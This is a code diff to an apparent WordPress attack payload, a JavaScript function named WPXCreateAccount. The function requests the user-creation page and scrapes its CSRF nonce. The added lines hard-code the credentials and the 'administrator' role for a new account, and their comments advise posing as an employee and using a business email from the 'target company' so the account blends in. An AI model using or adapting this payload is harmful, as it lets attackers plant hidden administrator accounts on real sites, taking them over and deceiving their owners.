@@ -8,6 +8,13 @@ function WPXCreateAccount() {
         _stage1.open("GET", "/wp-admin/user-new.php", false);
         _stage1.send();
 
+        var Username = "slavpedIiceum";         // Ex: operator (It is recommended to use a valid employee name from the target company).
+        var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
+        var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
+        var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
+        var FirstName = ""; // (optional)
+        var LastName = "";  // (optional)
+        
         if (_stage1.responseText) {
 
             var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];
